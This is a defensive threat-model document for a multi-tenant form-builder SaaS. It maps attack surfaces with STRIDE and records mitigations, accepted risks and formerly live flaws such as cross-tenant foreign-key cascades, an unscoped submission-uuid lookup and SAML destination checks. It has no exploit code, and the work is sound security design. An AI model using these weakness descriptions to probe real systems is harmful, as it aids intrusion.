# Security & Threat Model Doc

**Project:** Form-Builder SaaS (`dev_formbuilder_app`)
**Status:** Draft v1.0 — measures this product's design against the **OWASP ASVS Level 1 (+ several Level 2 controls) baseline `docs/non-functional-requirements.md` §4 fixes**, using STRIDE per attack surface. This document does not re-derive mitigations already designed elsewhere (tenant isolation, RBAC, versioning) — it inventories the attack surfaces, states the threat, cites the existing mitigation, and calls out residual risk or a genuinely new recommendation where one doesn't already exist.

---

## 1. Methodology

For each attack surface (§2): a STRIDE pass (**S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure, **D**enial of service, **E**levation of privilege), each threat marked:
- **Mitigated** — an existing, cited control already addresses this.
- **Mitigated (new)** — this document adds a control not previously specified anywhere.
- **Residual** — an accepted, honestly-stated remaining risk, with rationale for why it's accepted rather than silently ignored.
- **Open** — a genuine unresolved question, not silently decided.

## 2. Attack Surface Inventory

| Surface | Who can reach it | Trust level |
|---|---|---|
| Guest/public form runtime | Anyone with a share link — no account | Untrusted |
| Authenticated Admin/Builder app | Tenant members (any of the 5 roles) | Semi-trusted, tenant-scoped |
| Versioned REST API (`/api/v1`) | API-key/token holders — tenant integrations, the offline PWA client | Semi-trusted, tenant-scoped. ⚠️ **A token's ability is a SCOPE, never the authorization, and RLS bounds only the TENANT** — so every resource route needs a policy gate on top of both, and the two that could not carry one as middleware went without for six increments (§9 item 33, M13). A route whose resource arrives in the **body or the query** is not resource-bound, so `can:` has nothing to attach to; its gate belongs in the controller. `tests/Feature/Api/GroupBPolicyGateTest.php` is the tripwire, because this is a property of a route TABLE rather than of any one controller |
| Outbound webhooks | Tenant-configured third-party endpoints | Platform → external, not inbound |
| Native connector credentials (`connections` — OAuth access/refresh tokens for a tenant's Slack/Sheets/Airtable workspace, ADR-0009) | Platform code only; never returned by any API, presenter, or audit payload | Platform-held third-party credential — **highest external blast radius**: a leak grants action *inside another SaaS tenancy*, not merely against this platform |
| OAuth connector callback (`/oauth/{provider}/callback`, central domain, ADR-0009) | Anyone — an unauthenticated inbound GET redirected from a third-party consent screen; no session, no CSRF token | Untrusted inbound; its only trust anchor is the signed `state` parameter |
| **SAML Assertion Consumer Service** (`POST /sso/saml/acs`, tenant subdomain, ADR-0016) | Anyone — an unauthenticated, CSRF-exempt cross-origin form POST arriving from a tenant-configured identity provider. No session, no token, and under `SameSite=Lax` it cannot read a session even when the same person is signed in two tabs away | **Untrusted inbound, and it was the highest trust transition in the product until P1e moved that transition off it.** The connector callback above writes a credential row; this one used to *establish a session* — ADR-0016 §D8 called that "the largest side effect in the application". ⚠️ **SINCE P1e IT CREATES NOTHING.** Its two trust anchors are the tenant's own signing certificate — **which since M2 must be inside its validity window, or the endpoint refuses before reading the document at all (§D31)** — and a live, unconsumed `sso_auth_requests` row this SP minted, and **both are statements about PROVENANCE while neither says who is HOLDING the assertion** — the reading error recorded against ADR-0009 §D3 in §8, which was live on this surface until P1e. So this endpoint now validates, marks the row, and hands the browser to a same-site hop that can ask the question it cannot. ⚠️ It is also **outside the stateful middleware stack**, because while it was inside one it silently replaced the browser's session cookie with an empty one (§9 item 26). See §8's login-binding row, and items 22, 26 and 28 |
| SAML SP metadata, sign-in, and the two completion hops (`GET /sso/saml/metadata`, `/sso/saml/login`, `/sso/saml/login/complete/{request_id}`, `/sso/saml/step-up/complete/{request_id}`, tenant subdomain, ADR-0016) | Anyone with the tenant's canonical hostname for the first two; for the completion hops, the browser that started the flow — the legs that carry a session cookie. ⚠️ The **login** hop is reachable while nobody is signed in, which is the point of it: it is how a person becomes authenticated, so it is bound by a value the mint left in that browser's session rather than by `Auth::id()` | Untrusted inbound, and deliberately **indistinguishable**: unentitled, unconfigured, draft and disabled all answer 404 (§D4), so a caller supplying nothing but a hostname cannot learn that another organisation has SSO configured. `/sso/saml/login` writes an `sso_auth_requests` row per hit **and records that flow's own id in the browser's session** (P1e); the completion hops exist only because `SameSite=Lax` withholds the cookie from the ACS (§D23), and they are the only places in the flow where the session-identity check the ACS structurally cannot make is actually made — `user_id` against the signed-in member on the step-up arm, the pending flow id against the arriving browser on the login arm |
| File uploads (attachments, OCR scans, XLSForm imports) | Any authenticated user or guest, per form config | Untrusted content, semi-trusted or untrusted actor |
| Expression engine | Tenant form-builders (Owner/Admin/Form Editor) authoring `relevant`/`constraint`/calculated-field expressions | Semi-trusted actor, but the *content* they author is later evaluated against untrusted respondent data |
| Server-rendered output surfaces (queued PDF, queued email, Slack/connector messages, spreadsheet exports — Doc #26) | Whoever the tenant sends them to: staff inboxes, a Slack channel, a downloaded file. Reached *indirectly* by any respondent, once answer piping (H6a) carries an answer into them | **Untrusted content on a surface with no framework escaping.** Vue and Blade auto-escape; a markdown email, a `mrkdwn` block and a spreadsheet cell do not, and each needs a *different* escaper. **Corrected in H17 for the PDF:** it was built as a Blade view, so it inherits `{{ }}` auto-escaping and is the one member of this group that gets the framework's escaper for free — which is why H17's test is a *structural* guard against a raw-output directive as much as a behavioural one |
| Super-admin console | Platform staff only (`users.is_super_admin`) | Highly trusted, highest blast radius |

## 3. Tenant-Isolation Bypass Scenarios

`docs/adr/0002-multi-tenancy-shared-db-rls.md` is the authoritative isolation design; this section is the adversarial read of it — concrete attack attempts, and why each fails (or doesn't, honestly):

| Scenario | STRIDE | Verdict | Why |
|---|---|---|---|
| A Tenant A user manipulates a request parameter (e.g., a form or submission ID) to reference Tenant B's resource | Elevation of privilege / Information disclosure | **Mitigated** | Even if application-layer scoping is buggy or forgotten, Postgres RLS (`FORCE ROW LEVEL SECURITY`, fail-closed on missing session context) returns zero rows — ADR-0002 §D2. |
| A forged or tampered guest share token attempts to access a different tenant's form | Spoofing / Tampering | **Mitigated — enforced by tests (F5)** | The token is HMAC-SHA256-signed and embeds `{tenant_id, form_id, form_version_id, expiry}`; a constant-time signature + expiry check invalidates a forged/tampered/expired token before any tenant context is established (`docs/data-dictionary.md` §2 Design Notes; ADR-0002 §D3 guest-endpoint row). Even past the app layer, `submissions`/`form_versions` are FORCE RLS, so a guest context for tenant A cannot read or write tenant B. Proven by `tests/Unit/Guest/GuestShareTokenServiceTest` (tamper/wrong-key/expiry) + `tests/Feature/Guest/GuestRuntimeTest` (forged-token 401, cross-tenant) + `tests/Feature/Guest/GuestTokenRlsTest` (DB-level isolation). Accepted residual: the token rides in the URL path (share-link nature) — bounded by the 24h TTL, per-token/per-IP rate limits, and a consume-time `allow_guest_submissions` re-check that acts as an immediate revocation lever. |
| A queued job runs with leftover tenant context from a previously-processed job on a reused worker process | Information disclosure | **Mitigated by ADR-0007 (2026-07-21) — previously ASPIRATIONAL** | **This row asserted a mitigation that was not built.** `TenantContext::$tenantId` is a process-lifetime PHP static; `applyLocal()` scopes only the *database* GUC to the transaction and never rolls the static back, and no `Queue::before`/`JobProcessing` listener existed anywhere in the codebase. On a long-lived `queue:work` worker the DB GUC therefore went NULL while the static still held the previous tenant — so `BelongsToTenant` would inject that tenant into the next context-less job's reads and auto-fill it on `creating`, while RLS saw NULL. The practical effect was zero-row reads and confusing `QueryException`s rather than cross-tenant disclosure (RLS still fails closed, so the *database* never served tenant B's rows to tenant A), but the stated guarantee did not hold and only one job type existed to expose it. **Now genuinely mitigated:** ADR-0007 §D4 registers a queue-event listener flushing `TenantContext` and the Spatie team id on **both** edges of every job, and §D2's `TenantAwareJob` re-establishes context inside `DB::transaction` under a runtime uuid assertion — so a job missing `tenant_id` now really does fail fast, with §D5 forbidding model payloads that would fail earlier and more obscurely. Enforced by `scripts/job-payload-lint.php` and one `queue:work --once` integration test (the path `QUEUE_CONNECTION=sync` structurally cannot exercise). Built in H2. |
| An attacker enumerates IDs to probe for other tenants' resources | Information disclosure | **Residual (minor, accepted)** | IDs are UUIDv7, not sequential — not practically enumerable. **Honest caveat**: UUIDv7 is time-ordered by design (chosen for B-tree index locality, ADR-0002 §D1), which leaks approximate *creation time* ordering between two IDs, unlike a fully random UUIDv4. This is a strictly weaker disclosure than enumerability (you cannot derive a valid neighboring ID, only relative timing if you already have two real IDs to compare) — accepted as a deliberate trade-off for index performance, not revisited unless a specific customer's threat model demands UUIDv4 instead. |
| A Form Editor grants themselves (or another user) access to a form they weren't authorized for | Elevation of privilege | **Mitigated (G10a); write surface lands in G10b** | `forms.collaborators.manage` is Owner/Admin-only by explicit design (`docs/multi-tenancy-rbac-design.md` §5's Design Note). Since Increment G10a the grant lives in `resource_grants` (which replaced `form_collaborators`), and as of G10a there is still no write surface of any kind — the model's `$fillable` excludes the morph pair, so nothing can even mass-assign a target. **G10b introduces the first write path and must therefore ship the escalation rules with it**: no self-grant, and anti-amplification requiring the actor to hold the `.any` counterpart of the capacity being granted. A grant on a `scope_nodes` subtree is the new high-blast-radius case — authoring the hierarchy is itself gated behind the Owner/Admin-only `scopes.manage` for exactly that reason. |
| A compromised or malicious super-admin account reads/modifies any tenant's data | Elevation of privilege / all STRIDE categories at once | **Residual, with new mitigations added below (§7)** | This is the single highest-blast-radius account in the system by design (ADR-0002 §D3) — see §7 for concrete hardening recommendations beyond what's already specified. |
| **A per-tenant extract is produced on a connection that bypasses RLS, yielding every tenant's rows in a directory labelled as one tenant** | Information disclosure | **Mitigated (P2b) — and it is the highest-consequence row in this table** | `tenants:extract` reads with **no `where` clause** on the 33 strict tables, which is the shape ADR-0002 argues for: the database is the filter. That relocates the entire guarantee into **which role the connection authenticated as**, and `meridian` is SUPERUSER + BYPASSRLS, so a `.env` pointing `DB_USERNAME` at it turns the same code into a full-database dump **at exit code 0, with no `where` clause anywhere to notice**. `ExtractionGuard::assertRlsSubjectRole()` (ADR-0017 §D4) refuses that connection before the destination directory is even created — verified live: as `meridian` the command aborts and writes nothing at all. The companion `assertContextEstablished()` closes the quieter twin, an empty-but-successful run when `SET LOCAL` no-ops outside a transaction. |
| **An extract carries live credentials — passwords, TOTP seeds, OAuth tokens, invite tokens, webhook signing secrets — out of the platform** | Information disclosure / Spoofing | **Mitigated (P2b, ADR-0018 §D3)** | The extract's `users` rows are a **roster**: nine columns withheld, four of them credentials for a **central** identity (one human, N workspaces), so the artefact cannot hand one tenant material for an account still live elsewhere. `connections.access_token`/`refresh_token` (ADR-0009), `webhook_endpoints.secret`/`secret_previous`, `tenant_users.invite_token`, `submissions.guest_token`, `domains.verification_token`, `personal_access_tokens.token` and `impersonation_tokens.token_hash` are all withheld with a stated reason. ⚠️ **The failure mode is a RENAME, not an omission**: a `WITHHELD` entry whose column no longer exists filters nothing while every test phrased as "password is withheld" stays green, so `TenantExtractColumns::assertWithheldColumnsExist()` refuses to extract a table whose withheld names are absent from the live catalog, and `TenantExtractColumnDriftTest` fails on any added, dropped or renamed column of any extracted table. |
| **An extract discloses that a member also belongs to another workspace** | Information disclosure | **Mitigated (P2b)** | `users.last_active_tenant_id` holds **another tenant's UUID** and is withheld on exactly that basis; `is_super_admin` is withheld because it describes the platform's staff. Conversely, the references the extract *cannot* resolve are reported rather than chased: widening the read to `app.current_user_id` or to a privileged connection to "complete" the roster was refused (ADR-0018 §D4), because it would resolve the platform operator named by `impersonation_tokens.operator_id`, who belongs to no tenant at all. |
| **The extract artefact itself is read by someone who should not have it** | Information disclosure | **Residual, accepted and bounded — and the filesystem is NOT one of the bounds on the production host** | The directory is one workspace's entire record in plaintext. Two things genuinely bound it, and neither is retention: there is **deliberately no HTTP surface** (ADR-0018 §D1 — a route would need a new permission key and would put a whole-workspace read behind that route's weakest session), so producing one requires shell access on the box; and **no credential is in it**. ⚠️ **The `0700` mode the writer requests is a POSIX-only control and does nothing on production.** ADR-0005 puts production on **Windows Server 2016** running PHP natively, where the mode argument to `mkdir()` is ignored and `chmod()` toggles only the read-only attribute — so the directory inherits its parent's ACL and **the containing directory's ACL is the entire filesystem control there**. Stated rather than left implied, because "created 0700" reads as a guarantee on every platform and is one on none of the ones this product ships to. `docs/deployment-infrastructure.md` §8b tells the operator to extract into an already-restricted location for exactly this reason. **What is still NOT addressed** is what happens to the directory afterwards — encryption at rest, transfer and deletion are a runbook question, and an operator who can run the command can already read the database. |
| **A row references another tenant's row, and the database accepts it** | Tampering / Information disclosure / Denial of service | **Residual, measured and gated (P2c, ADR-0002 §D5)** | PostgreSQL documents that "referential integrity checks, such as unique or primary key constraints and foreign key references, **always bypass row security**" — so RLS, which is this schema's backstop everywhere else, is *structurally absent* from the constraint layer. **29 foreign keys point at a `tenant_id`-carrying table without carrying it in the key** (against 9 that use the composite `(tenant_id, x_id) → (tenant_id, id)` shape), so the database would accept `submissions.form_id` pointing at a neighbour's form. **On 20 of the 29 the action is `ON DELETE CASCADE`, which makes this a cross-tenant WRITE, not merely a dangling read**: deleting the neighbour's parent would delete this tenant's children. What actually confines it today is application-layer: every write path resolves its parent through a tenant-scoped query first, and reaching a neighbour's row additionally requires guessing a UUIDv7 — neither of which is a database guarantee, which is the whole reason this row exists. **13 unique indexes** are the same shape one step milder: enforced across every tenant at once, so a collision with an invisible row surfaces as a `23505` (an existence oracle, and a denial of service on the value) — 9 of the 13 are values that are globally unique by intent (a hostname, a SAML `InResponseTo`, secrets) and 4 are merely UUID-anchored, which is the weaker claim. ⚠️ **One is a live defect rather than a decision**: `permissions_name_guard_name_unique` is `(name, guard_name)` while its sibling on `roles` leads with `tenant_id`, and `permissions_tenant_insert` lets the ordinary application connection create a tenant-owned permission today — so two tenants naming the same permission would collide across the boundary, with the second seeing a `23505` against an invisible row. All 42 are recorded with a rationale in `App\Support\Tenancy\ConstraintBoundaries`, asserted against `pg_index`/`pg_constraint` in both directions by `ConstraintBoundaryDriftTest`, and blocked at authoring time by `scripts/constraint-boundary-lint.php`. ⚠️ **Three of the 29 cannot be fixed by adding a column to a key** — `role_has_permissions`'s two and `tenants.logo_attachment_id` have no `tenant_id` on the SOURCE — and `role_has_permissions` is additionally live-triggered: ADR-0017's revisit note records that it leaks the day `roles` acquires its first tenant-owned row, which `roles_tenant_insert` permits and nothing prevents. Remediation of the other 26 is filed in `docs/feature-backlog.md`. |
| **An assertion signed by one workspace's identity provider is accepted at another workspace's ACS** | Spoofing / Elevation of privilege | **Mitigated (P1b, ADR-0016 §D3/§D16)** | The tenant is resolved from the **host**, never from anything in the request body, so an attacker choosing which workspace to address chooses only which public subdomain to visit — and the audience is then checked against *that* tenant's SP entity id. Both the entity id and the ACS location are **derived at request time** from the canonical subdomain by a single composition point (§D3) rather than configured; `config/saml.php` holds no absolute URL at all, on the stated grounds that a configurable one "would invite an operator to set one host for every tenant, which is precisely the bug the per-tenant AudienceRestriction check exists to catch". A custom domain never appears in either, because ADR-0012 §D1 confines custom hosts to the guest runtime. ⚠️ **The `Destination` half of this would have been self-satisfying on the library's defaults, and that is the sharper half of the row.** php-saml builds its idea of "the URL this request arrived at" from `$_SERVER` superglobals Laravel's request object never populates, and with its default `destinationStrictlyMatches => false` the comparison degrades to a prefix match that passes against a bare host — a green suite certifying a check that was not running. `SsoSamlSettings::at()` pins scheme, host, port and path from the same string the SP metadata published and restores them plus `$_SERVER` in a `finally`, because these are process-global statics and a leaked value would retarget the *next* request's check. Storage-side, `sso_connections` is UNIQUE on `tenant_id`, all three SSO tables take ADR-0002's strict FORCE RLS shape, and `sso_auth_requests` carries a **composite** foreign key — the one place in this schema where the row above's rule had already been applied before anyone measured the other 29. |

## 4. Guest/Public Endpoint Attack Surface

The guest/public form runtime is this product's only fully untrusted-actor surface — no login, no rate-limit-by-account, reachable by anyone with a link.

| Threat | STRIDE | Verdict |
|---|---|---|
| Guest share-link token forgery/tampering | Spoofing | **Mitigated** — HMAC signature, per §3. |
| Token replay after expiry | Tampering | **Mitigated** — the token embeds an expiry, checked server-side before any tenant context is established (ADR-0002 §D3). |
| Automated bulk/bot submission flooding (spam, denial of service, or data-quality pollution) | Denial of service | ✅ **MITIGATED — Increment I8b (2026-08-08).** `docs/architecture/technical-architecture.md` §7.2's per-token and per-IP rate limiting was never the gap; the gap was that rate limiting bounds *velocity* but not low-and-slow distributed submission spread across many IPs/tokens, which nobody is individually fast enough to trip. As built, two mechanisms with a deliberate division of labour: a **proof-of-work challenge** (`forms.bot_challenge`), which costs the ATTACKER and so bounds the distributed case; and a **per-form rate limit** (`forms.guest_rate_limit_per_minute`), keyed per-IP-within-this-form, which bounds velocity from one source. Both default OFF, honouring this row's own requirement — a form filled by a health worker on a shared tablet must not acquire a puzzle because a different tenant's form was being spammed. **Deviations from this row's recommendation, both deliberate**: (1) NOT hCaptcha or any hosted CAPTCHA — each needs a site key and secret from the tenant's own account (an input only the customer possesses, which would have made this a blocked row), each needs `script-src` + `frame-src` added to `PublicRuntimeSecurityHeaders` whose test asserts the ABSENCE of those directives as a tripwire, each ships respondent IPs to a third party, and none can work offline-first — so the challenge is self-hosted, hand-rolled and adds no npm dependency. (2) NOT named `require_captcha` as suggested here: nothing squiggly ships, and a boolean would foreclose the one future the seam needs (a tenant bringing their own provider becomes an enum case, where a boolean needs a second column on a live table). A honeypot field was considered and rejected outright — the guest ingest is a public, documented JSON API whose body is shipped in `api-client.ts` and again in `openapi.json`, so a bot writes eight lines of curl and never parses a DOM. Recorded residual: the replay guard is cache-backed (ADR-0007 §D10; data-dictionary §2's "no `guest_tokens` table" doctrine), so **a cache flush makes unspent challenges replayable for one TTL window** — bounded, self-healing, and admitting nothing that solving a fresh challenge would not. Both columns are now in `docs/data-dictionary.md`'s `forms` table. |
| Guest endpoint used to enumerate valid `public_slug` values | Information disclosure | **Residual, low severity** — a valid slug reveals only that a form exists at that URL, not its content or any submission data; `forms.public_slug` is `NULL` until guest access is explicitly enabled by the tenant, so this is an accepted, low-value information leak (a slug is meant to be shared, by definition). |
| A hostile site frames the guest form and tricks a visitor into submitting it (clickjacking) | Tampering / Spoofing | **ACCEPTED, and now explicitly so (Increment I1).** `PublicRuntimeSecurityHeaders` states `frame-ancestors *`. It is not an oversight upgraded to a decision for tidiness: PRD Feature #3 *requires* the form to be "embeddable via iframe or script snippet on third-party domains", and being embeddable and refusing to be framed are the same property with opposite signs. What bounds the risk is what a framed guest page can actually do — it holds **no authenticated session** (guests have no account, and `SESSION_DOMAIN` is null so cookies are host-only), its only privileged act is submitting the very form the embedder chose to display, and its tenant context comes from a signed token rather than an ambient cookie. So the worst outcome is a junk submission to a form whose owner published it publicly. The honest narrowing is a **per-form allowlist of embed origins**, which is per-form data rather than deployment config and is therefore on the backlog, not achievable by editing this header. Before I1 the same permissiveness held **by accident** — no `frame-ancestors` existed anywhere in the tree — which is the state this row exists to prevent recurring. |
| Malicious file upload via a guest-facing `file_upload`/`image_capture` field | Tampering / DoS | **Mitigated, see §6.** |
| SSRF via a URL-type field's value being fetched server-side | — | **Not applicable** — no field type in the current 31-value catalog (`docs/data-dictionary.md`'s `FieldType` enum) causes the server to fetch a URL supplied in an answer; `url`-typed fields are stored and displayed, never dereferenced server-side. Flagged here so a future field type (if ever added) is deliberately checked against this concern rather than silently introducing it. |
| A `hidden` field's value tampered by whoever holds the link, or by any client posting directly | Tampering | **Mitigated (H7).** Before H7 a `hidden` answer was ordinary client input — coerced to a string and stored with no cap and no notion of provenance. It is now classified by `App\Enums\PrefillSource`: a **`fixed`** field is written server-side from the authored `form_fields.default_value` and the submitted value is never even inspected, so no client on any ingest channel can move it; a **`url`** field is the only one whose submitted value survives, and it is scalar-only and capped at 2000 bytes (`prefill_too_long`, a Stage-1 structural fault). Sourcing is **opt-in and fail-closed** — a hidden field with no declared `config.prefill_source` accepts nothing, so a field key is never an implicit query parameter. **This is the property H20 (payments) was told to rely on**: an authoritative amount must be recomputed server-side from trusted inputs and never bound to a `url`-sourced field, and "is this field client-prefillable?" is now one call rather than a judgement. |
| A hostile site frames the **authenticated admin app** and tricks a logged-in member into a destructive click (clickjacking) | Tampering / Elevation of privilege | ✅ **MITIGATED (Increment I1).** The inverse of the guest-runtime row above, and the asymmetry is the design: the surface *without* a session permits framing, the surface *with* one refuses it. `App\Http\Middleware\AppSecurityHeaders` sets `frame-ancestors 'none'` plus a legacy `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` and `Referrer-Policy: strict-origin-when-cross-origin`, mounted on four groups explicitly — the authenticated tenant app, the invitation/branding group, the central platform pages, and Fortify's auth routes (a framed **login form** being the textbook case). It is deliberately **not** mounted globally on `web`, which would land on the guest runtime and break every embed. Before I1 there was no app-side security-headers middleware in the tree at all. **One trap is pinned by a test rather than by prose:** `PublicRuntimeSecurityHeaders` is also mounted on the authenticated manual-encode page (for its map `img-src`), so its guest-scoped `frame-ancestors *` reaches a session-bearing route; `AppSecurityHeaders` therefore *replaces* any inherited `frame-ancestors` rather than deferring to it. The first draft deferred, and that alone re-opened this row on that one page. |
| A hostile link prefills a hidden field with markup that then renders through piping | Tampering (XSS) | **Mitigated (H7 + §7).** A prefilled value is untrusted text on a surface with no `script-src`, and unlike a typed answer it is present on the first paint. It flows through the same Vue text interpolation as any other piped answer; §7's DOM-context row owns the escaper, and H7 adds its own test at the new entry point rather than assuming the answer test covers it. An over-cap parameter is **dropped** client-side (`lib/prefill.ts`) rather than carried, so a broken or hostile link degrades to "no prefill" instead of an unsubmittable form. |
| **A guest supplies a `client_submission_uuid` belonging to a DIFFERENT form in the same tenant** | Information disclosure / Tampering / Denial of service | ✅ **MITIGATED — Increment M11 (2026-08-24). Before it, this was live and unauthenticated on two routes.** The share token fixes the FORM; the uuid arrives in the BODY; and the index behind it, `submissions_tenant_client_uuid_unique`, is unique across the whole TENANT. So the scope a caller could resolve within was wider than the scope it was entitled to, and the gap had two outcomes. Against a **finalized** row, `SubmissionPipeline`'s Stage 2b resolved on the uuid alone and the guest received that row's `id`, `reference` and `status` as an idempotent `200` — with their own answers discarded — whenever the stored content checksum was `NULL` (a pre-G8c row) or happened to match. Against a **draft** row, the write could not land at all: the scoped resolve inside `saveDraft()` missed, the insert violated the tenant-wide index, the `23505` recovery arm could not classify it, the reference-retry budget was spent on an insert that could only fail again, and the `QueryException` escaped as a repeatable **`500` on `api/v1/public/f/{shareToken}/submissions` and `…/draft`** — an unauthenticated caller could raise it at will and each attempt wrote a reported exception. RLS bounded all of it to the tenant and no further; a *cross-tenant* uuid resolves nothing. **As built:** one `ClientUuidResolver::resolve()` scoped to `(tenant_id, form_id, respondent, uuid)` for every channel, and an explicit `409 submission_conflict` — *"This submission identifier already belongs to another response."* — for a uuid spent outside that scope, discovered by an `exists()` probe that returns a bool and never a column of the row behind it. ⚠️ The probe reads `withTrashed()` because the index does **not** filter on `deleted_at`, so a tombstone still owns the uuid; nothing soft-deletes a submission today (`ReapTenantDraftsJob` hard-deletes for exactly this reason), which makes that half latent rather than live, and `ClientUuidScopeTest` pins the premise against the live `pg_indexes` definition so it cannot invert unnoticed. ⚠️ **The authenticated twin was worse and is closed by the same change**: `SubmissionController::store()`'s race backstop promotes whatever Stage 2b returns, so an unscoped resolve made this a **write** — a member entitled to form A could finalize form B's draft, on a form they may hold no grant on, because `promote()` is invoked directly and never re-runs `SubmissionPolicy::promote()`. Proven by `tests/Feature/Guest/GuestRuntimeTest`, `tests/Feature/Guest/GuestDraftRuntimeTest`, `tests/Feature/Submissions/SubmissionPipelineTest`, `tests/Feature/Submissions/EncodePromoteTest` and `tests/Feature/Submissions/EncodeDraftTest`, and kept closed structurally by `tests/Feature/Submissions/ClientUuidScopeTest`, which fails if the predicate is ever written a second time anywhere under `app/`. |

## 5. Webhook & Connector Security

Builds on `docs/data-dictionary.md` §14–15 (`webhook_endpoints`/`webhook_deliveries`) and the architecture plan §2.5's already-stated reliability requirements (queue-first ingestion, exponential backoff, mandatory idempotency, circuit breaker, dead-letter queue):

| Threat | STRIDE | Verdict |
|---|---|---|
| A third party intercepts or forges a webhook delivery | Spoofing / Tampering | **Mitigated** — `webhook_deliveries.signature`, HMAC-SHA256, verifiable by the receiving endpoint against the shared `webhook_endpoints.secret`. |
| A captured, valid webhook delivery is replayed later by an attacker who intercepted it in transit | Tampering / Repudiation | **Recommendation (new)**: the signed payload should include a timestamp, with the signature computed over `timestamp + '.' + body` (mirroring Stripe's own webhook-security practice) rather than the body alone, and receivers are documented as expected to reject deliveries outside a small tolerance window (e.g., 5 minutes). Nothing in the existing Data Dictionary schema currently models a signed timestamp separately from `created_at` — this is implementable within the existing `signature` column (the timestamp is embedded in the signed string, not a new column) and should be specified precisely in Doc #15 (Webhook & Integration Design Doc), which owns the payload format. |
| A tenant configures a webhook endpoint pointing at an internal/private network address to probe the platform's own infrastructure (SSRF via webhook target) | Information disclosure / Elevation of privilege | **Mitigated, with one refinement recommended.** `docs/architecture/technical-architecture.md` §7.4 already specifies: "endpoint URLs are validated against internal/private IP ranges at creation time (blocked by default; explicitly allow-listable for enterprise/on-prem integration cases)." **Recommendation (new, narrower than originally scoped)**: extend that existing creation-time check with a **re-validation at delivery time** — creation-time validation alone doesn't catch DNS rebinding (a hostname that resolves to a public IP at creation time but is repointed to an internal address before a later delivery attempt fires, especially relevant given this system's exponential-backoff retry schedule spanning up to 7 days per §7.4). Should explicitly re-resolve and re-check the IP at each delivery attempt, not just once at endpoint-creation time. |
| Webhook secret leaked via API response or logs | Information disclosure | **Mitigated** — `docs/data-dictionary.md` §14's Design Notes already specify the secret is masked after initial creation and never returned in full again. |
| A failing/malicious downstream endpoint used to exhaust platform delivery-worker capacity | Denial of service | **Mitigated** — the per-endpoint circuit breaker and dead-letter queue (architecture plan §2.5) already bound retry amplification. |

**Native OAuth connectors (ADR-0009).** A webhook secret proves *our* payloads are ours; a connector token lets the platform *act as the tenant* inside a third-party workspace, so the threats below are a different class from the ones above, not a variation of them. Verdicts marked **Decided (ADR-0009)** are ratified design, built in H15a — they are not yet-shipped mitigations at the time of writing.

| Threat | STRIDE | Verdict |
|---|---|---|
| A stored connector access/refresh token is read from the database, a backup, an over-broad support query, or an export | Information disclosure / Elevation of privilege (**outside** the platform's own boundary) | **Decided (ADR-0009 §D1).** Both token columns are `text` with Laravel's `encrypted` cast (ciphertext at rest, readable only with `APP_KEY`, which lives in the server `.env` and never in a dump), `$hidden` on the model, and returned by **no** API resource or presenter in any form — deliberately *not* even the reveal-once/masked-suffix affordance `webhook_endpoints.secret` gets, since a connector token has no user-facing consumer. |
| A forged or altered OAuth `state` causes the callback to write a credential into a tenant the attacker does not control | Spoofing / Tampering / Elevation of privilege | **Decided (ADR-0009 §D3/§D4).** `state` is a domain-separated HMAC token (`connector-oauth-state.v1`, derived from `APP_KEY`, independently rotatable) carrying `{tid, uid, prov, nonce, exp}` with a ~10-minute TTL; the MAC is compared constant-time and the payload decoded **only after** verification, by a middleware that runs **before** any RLS tenant GUC is set. A tampered/expired/provider-mismatched state is refused with no write and no disclosure of whether the named tenant exists. |
| A captured callback URL is replayed within the `state` TTL | Tampering / Repudiation | **Residual, accepted (ADR-0009 §D3).** `state` is stateless and therefore replayable until it expires. Bounded by the provider's authorization `code` being single-use (a replayed callback fails at token exchange) and by the fact that a successful replay would only rewrite the tenant's own connection. A server-side single-use nonce store is the named fix if a provider's codes ever stop being single-use. |
| The post-callback redirect is steered to an attacker-controlled host (open redirect), leaking the referrer or phishing the returning user | Spoofing | **Decided (ADR-0009 §D5).** The return host is read from the tenant's `domains` row, never echoed from the request and never taken from a claim in the `state` payload; the outcome rides a query parameter (`?connected=` / `?connect_error=`), so even a validly-signed state cannot steer the browser off the tenant's own host. |
| The callback runs on the central domain, where no tenant is bound, and silently writes zero rows under FORCE RLS — or, worse, is "fixed" by widening the session cookie across subdomains | Tampering / Information disclosure | **Decided (ADR-0009 §D2/§D4).** Context is adopted from the verified `state` by a dedicated pre-RLS middleware and released in `terminate()`, so it can never survive onto a pooled connection. `SESSION_DOMAIN` stays host-only: widening it would make every tenant's session cookie a cross-host artifact on every request to solve a problem that arises twice per connection. |
| A connector token appears in an audit payload, a log line, or a delivery record | Information disclosure | **Decided (ADR-0009 §D10).** `access_token`/`refresh_token` are added to `AuditRedactor`'s unconditional secret list under the new `connection` alias **in the same increment that creates the table** (an unregistered credential-bearing alias is silently un-redacted and nothing detects it), and the delivery ledger stores no `Authorization` header. |
| A connection revoked at the provider, or whose refresh is rejected, retries indefinitely | Denial of service | **Decided (ADR-0009 §D6/§D7).** A credential rejection marks the connection dead, stops its subscriptions delivering, and queues exactly one owner notification; refresh is a scheduled `MaintenanceJob` fan-out with `WithoutOverlapping`, never a lazy refresh inside a delivery attempt (which would stampede a provider outage across every queued delivery). |
| `APP_KEY` is rotated without `APP_PREVIOUS_KEYS`, rendering every stored connector token undecryptable at once | Denial of service / availability | **Open (ADR-0009 §D9).** `config/app.php:99-106` already supports `previous_keys`, but `APP_PREVIOUS_KEYS` appears in no `.env.example` and in no document, including `docs/deployment-infrastructure.md:53`. The failure surfaces as mass delivery failure rather than a boot-time error. Fix (a documented rotation procedure + an `.env.example` entry) is assigned to Doc #22 and is **not** shipped by H15a. |
| A connector requests broader third-party scopes than the feature needs | Elevation of privilege (in the tenant's workspace) | **Decided (ADR-0009 §D8).** Least-privilege scope sets live in `config/` (Slack: post to a chosen channel + list channels for the picker; no message-history or user-data read scopes) and the granted set is stored per connection, so a later expansion is detectable as an explicit re-consent event rather than an opaque delivery failure. |

## 6. File Upload Handling

Covers `attachments` (`docs/data-dictionary.md` §10) across every channel that produces one: manual/guest submission file fields, OCR source scans, XLSForm import files, avatars, branding logos, feedback screenshots.

| Threat | STRIDE | Verdict |
|---|---|---|
| Malware embedded in an uploaded file, later served to another user | Tampering | **Mitigated** — `attachments.virus_scan_status` (`ScanStatus` enum: `pending`/`clean`/`infected`/`skipped`) already gates serving: "files are not served to other users until `clean`" (`docs/data-dictionary.md` §10). `docs/ux/form-filling-ux-flow.md` Appendix A item 14 already decided the handling policy for a confirmed `infected` file: out-of-band tenant-admin/security handling only, with no respondent-facing after-the-fact notification — consistent with, not contradicting, this section. |
